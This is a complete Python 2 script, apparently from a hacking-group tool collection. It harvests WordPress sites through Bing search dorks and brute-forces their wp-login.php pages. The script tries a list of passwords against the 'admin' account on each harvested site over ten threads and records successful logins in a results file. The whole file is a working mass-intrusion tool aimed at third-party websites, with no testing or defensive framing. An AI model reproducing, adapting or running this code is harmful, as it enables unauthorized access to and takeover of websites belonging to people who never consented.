#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
#Author D4RK5H4D0W5
#Maklum kalo berantakan ster
G0 = '\033[0;32m'
C0 = '\033[0;36m'
W0 = '\033[0;37m'
R0 = '\033[0;31m'
Y0 = '\033[0;33m'
import requests,os,sys
from bs4 import BeautifulSoup
from multiprocessing.pool import ThreadPool
def logo():
	os.system('clear')
	print '''%s
 _       ______     __               __
| |     / / __ \   / /_  _______  __/ /____    %sCoded by D4RKSH4D0WS%s
| | /| / / /_/ /  / __ \/ ___/ / / / __/ _ \\   %sIG @anonroz_team%s
| |/ |/ / ____/  / /_/ / /  / /_/ / /_/  __/   %sFB gg.gg/AnonRoz-Team%s
|__/|__/_/      /_.___/_/   \__,_/\__/\___/    Enjoy >/<
'''%(C0,W0,C0,W0,C0,W0,C0)
def dork():
	logo()
	dork=raw_input('%s[%s?%s] Input dork : '%(W0,G0,W0))
	page=raw_input('%s[%s?%s] Input page : '%(W0,G0,W0))
	c=0
	print
	for taek in range(int(page)):
		c+=11
		res=requests.get('http://www.bing.com/search?q='+dork+'&first='+str(c),headers={'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36'})
		soup=BeautifulSoup(res.text,'html.parser').find_all('ol')
		for crot in soup:
			try:
				for site in crot.find_all('a'):
					if '/search?q' in site['href']:continue
					else:print '    '+site['href'];open('1','a+').write(site['href']+'\n')
			except:break
	try:open('1').read()
	except:exit('%s[%s!%s] No result %s'%(W0,R0,W0,dork))
	for domain in open('1').read().split('\n'):
		if 'bing' in domain:continue
		elif 'microsoft' in domain:continue
		else:open('2','a+').write(domain+'\n')
	os.system('rm -rf 1')
	for site in open('2'):
		try:open('3','a+').write(site.split('/')[0]+'//'+site.split('/')[2]+'\n')
		except:break
	os.system('rm -rf 2')
	raw_input('\n%s[%s!%s] Click enter to continue'%(W0,R0,W0))
	logo()
	password = raw_input('%s[%s!%s] Set password use (,)\n    For new password EX: admin,pass\n%s[%s?%s] Set password : '%(W0,R0,W0,W0,Y0,W0)).split(',')
	global password
	print
def wp(url):
	try:
		for pasw in password:
			res=requests.get(url+'/wp-login.php',timeout=10).status_code
			if res == 200:
				req=requests.post(url+'/wp-login.php',data={'log':'admin','pwd':pasw},timeout=10)
				if 'wp-admin/profile.php' in req.text:print '%s[%s  found  %s] %s admin:%s'%(W0,G0,W0,url,pasw);open('results.txt','a+').write(url+'  admin:'+pasw+'\n')
				elif 'Invalid username' in req.text:print '%s[%sinvalid username%s] %s admin:%s'%(W0,R0,W0,url,pasw)
				elif 'Unknown username' in req.text:print '%s[%sunknown username%s] %s admin:%s'%(W0,R0,W0,url,pasw)
				else:print '%s[%sfailed%s] %s admin:%s'%(W0,R0,W0,url,pasw)
			else:print '%s[%s %s %s] %s/wp-login.php'%(W0,R0,res,W0,url)
	except:print '%s[%sunk error%s] %s admin:%s'%(W0,R0,W0,url,pasw);pass
try:logo();dork();ThreadPool(10).map(wp,open('3').read().splitlines());os.system('rm -rf 3');exit('\n%s[%s✓%s] Done, found saved in results.txt'%(W0,G0,W0))
except requests.exceptions.ConnectionError:exit('%s[%s!%s] Check internet'%(W0,R0,W0))
except IOError:exit('%s[%s!%s] File does not exist'%(W0,R0,W0))
except KeyboardInterrupt:exit('\n%s[%s!%s] Exit'%(W0,R0,W0))